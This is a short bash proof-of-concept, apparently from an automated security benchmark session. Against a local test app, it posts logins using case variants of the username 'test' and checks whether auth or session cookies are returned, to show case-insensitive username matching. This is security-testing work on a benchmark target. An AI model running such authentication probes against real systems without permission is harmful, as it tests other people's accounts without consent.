#!/bin/bash
# POC: Demonstrates case-insensitive username matching vulnerability by authenticating with various case combinations of the username
# Target: ./repo
# Created: 2025-11-04T17:38:57.507Z
# Session: benchmark-XBEN-027-24-mhku77j0

# POC for Case-Insensitive Username Matching Vulnerability
# This script demonstrates that the authentication system accepts username variations
# including uppercase, lowercase, and mixed case versions

TARGET="http://localhost:8080"
CORRECT_USERNAME="test"
CORRECT_PASSWORD="test"

echo "=========================================="
echo "Case-Insensitive Username Matching POC"
echo "=========================================="
echo ""

# Test cases - various case combinations of the username
declare -a USERNAME_VARIATIONS=("test" "TEST" "Test" "TeSt" "tEST" "TEST" "tEsT")

for username_variant in "${USERNAME_VARIATIONS[@]}"
do
    echo "Testing with username: '$username_variant'"
    
    # Make POST request to /password/{username} endpoint
    response=$(curl -s -i -X POST "${TARGET}/password/${CORRECT_USERNAME}" \
        -d "username=${username_variant}&password=${CORRECT_PASSWORD}" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    # Extract HTTP status code
    http_code=$(echo "$response" | head -1 | awk '{print $2}')
    
    # Check for auth_token in Set-Cookie header
    auth_token=$(echo "$response" | grep -i "set-cookie.*auth_token" | head -1)
    
    # Check for session cookie
    session_cookie=$(echo "$response" | grep -i "set-cookie.*session" | head -1)
    
    if [ -n "$auth_token" ] || [ -n "$session_cookie" ]; then
        echo "  ✓ Status: $http_code - Authentication SUCCESSFUL"
        [ -n "$auth_token" ] && echo "  ✓ auth_token Set: YES"
        [ -n "$session_cookie" ] && echo "  ✓ session cookie Set: YES"
    else
        echo "  ✗ Status: $http_code - Authentication FAILED"
    fi
    
    echo ""
done

echo "=========================================="
echo "Vulnerability Confirmed:"
echo "The application accepts multiple case variations"
echo "of the same username, indicating case-insensitive"
echo "username matching in the authentication mechanism."
echo "=========================================="